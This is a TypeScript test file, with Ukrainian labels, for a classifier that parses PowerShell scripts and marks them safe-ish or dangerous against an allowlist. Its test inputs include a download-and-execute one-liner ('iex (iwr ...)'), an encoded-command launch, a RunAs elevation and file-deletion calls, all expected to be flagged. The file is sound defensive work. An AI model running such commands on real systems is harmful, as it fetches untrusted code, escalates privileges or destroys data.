// Справжній парсер PowerShell: скрипти лише розбираються, нічого з них не виконується.
import { DEFAULT_POWERSHELL_ALLOWLIST } from '@banshee/shared';
import { afterAll, describe, expect, it } from 'vitest';
import { classifyScript } from './classify.ts';
import { createShell } from './powershell.ts';

const shell = createShell();
afterAll(() => {
  shell.close();
});
const classify = (script: string, allowlist = DEFAULT_POWERSHELL_ALLOWLIST) =>
  classifyScript(shell, script, allowlist);

describe('рівень PowerShell за AST', { timeout: 30_000 }, () => {
  it('команди зі списку дозволених — 🟡, аліаси розкриваються', async () => {
    expect(
      await classify('Get-Process | Sort-Object WS -Descending | Select-Object -First 5'),
    ).toEqual({
      level: 'yellow',
      commands: ['Get-Process', 'Sort-Object', 'Select-Object'],
      reasons: [],
    });
    expect((await classify('gps | select -First 3')).commands).toEqual([
      'Get-Process',
      'Select-Object',
    ]);
    expect((await classify('(Get-Date).AddDays(-1).ToString("yyyy-MM-dd")')).level).toBe('yellow');
  });

  it('команда поза списком — 🔴, і вкладена в блок теж', async () => {
    expect(await classify('Remove-Item C:\\temp\\notes.txt')).toMatchObject({
      level: 'red',
      reasons: ['Remove-Item — не в списку дозволених'],
    });
    expect((await classify('Get-Process | ForEach-Object { Remove-Item $_.Path }')).level).toBe(
      'red',
    );
    expect((await classify('ipconfig /all')).level).toBe('red');
  });

  it('завжди 🔴: Invoke-Expression, завантаження, RunAs, -EncodedCommand — навіть у списку', async () => {
    const generous = [...DEFAULT_POWERSHELL_ALLOWLIST, 'Invoke-WebRequest', 'powershell'];
    expect((await classify('iex (iwr https://example.com/x.ps1)', generous)).level).toBe('red');
    expect((await classify('Start-Process notepad -Verb RunAs')).reasons).toContain(
      'права адміністратора (-Verb RunAs)',
    );
    expect((await classify('powershell -enc AAAA', generous)).reasons).toContain('-EncodedCommand');
  });

  it('змінна замість команди, запис у файл, методи .NET і помилки синтаксису — 🔴', async () => {
    expect((await classify('$c = "Remove-Item"; & $c C:\\x')).level).toBe('red');
    expect((await classify('Get-Process > C:\\out.txt')).reasons).toContain(
      'запис у файл перенаправленням',
    );
    expect((await classify('[System.IO.File]::Delete("C:\\x.txt")')).reasons).toContain(
      'виклик методу .NET Delete()',
    );
    expect((await classify('Get-Process |')).reasons).toContain('скрипт з помилками синтаксису');
  });
});
